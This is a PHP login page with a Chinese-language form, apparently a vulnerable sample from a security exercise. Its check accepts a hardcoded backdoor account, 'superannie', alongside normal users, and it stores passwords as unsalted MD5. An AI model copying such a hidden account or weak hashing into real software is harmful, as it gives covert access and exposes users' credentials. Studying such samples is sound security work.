<?php
	require_once("../lib/common.php");
	if(isset($_POST["username"]) && isset($_POST["password"])) {
		$username = mysql_real_escape_string($_POST["username"]);
		$password = md5($_POST["password"]); // 前輩說用雜湊保存才不會洩漏密碼

		if (is_valid_user("CRD",$username,$password) || (($username=="superannie")&&($password=="*****"))) {
			$_SESSION["user"] = $username;
			header("Location: index.php");
			exit();
		} else {
			$errorMessage = "帳號或密碼不正確";
		}
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<head>
      <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>
      <title>帳號登入</title>
      <link rel="STYLESHEET" type="text/css" href="css/style.css" />
</head>

<body>
	<div id='crd_membersite'>
	<form id='login' action='login.php' method='post' accept-charset='UTF-8'>
	<fieldset >
	<legend>請輸入帳號密碼</legend>

	<input type='hidden' name='submitted' id='submitted' value='1'/>

	<div class='short_explanation'>* 必填欄位</div>

	<div><span class='error'><?php echo $errorMessage; ?></span></div>
	<div class='container'>
	    <label for='username' >帳號*:</label><br/>
	    <input type='text' name='username' id='username' value='' maxlength="50" /><br/>
	    <span id='login_username_errorloc' class='error'></span>
	</div>
	<div class='container'>
	    <label for='password' >密碼*:</label><br/>
	    <input type='password' name='password' id='password' maxlength="50" /><br/>
	    <span id='login_password_errorloc' class='error'></span>
	</div>

	<div class='container'>
	    <input type='submit' name='Submit' value='Submit' />
	</div>
	</fieldset>
	</form>
	</div>
</body>
</html>
